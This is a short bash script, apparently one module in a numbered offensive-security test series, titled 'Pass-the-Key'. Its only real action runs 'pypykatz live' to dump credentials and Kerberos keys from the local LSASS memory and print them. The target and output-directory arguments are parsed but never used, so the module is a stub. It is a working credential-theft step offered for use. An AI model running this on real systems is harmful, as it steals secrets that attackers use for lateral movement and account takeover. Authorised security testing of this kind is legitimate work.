#!/bin/bash
# V-098 -- Pass-the-Key
# Tool: pypykatz
# Usage: bash V-098.sh <target> <session_output_dir>

TARGET="${1:?Usage: V-098.sh <target> <session_output_dir>}"
SESSION_DIR="${2:-}"

pypykatz live 2>&1 | head -30
exit $?
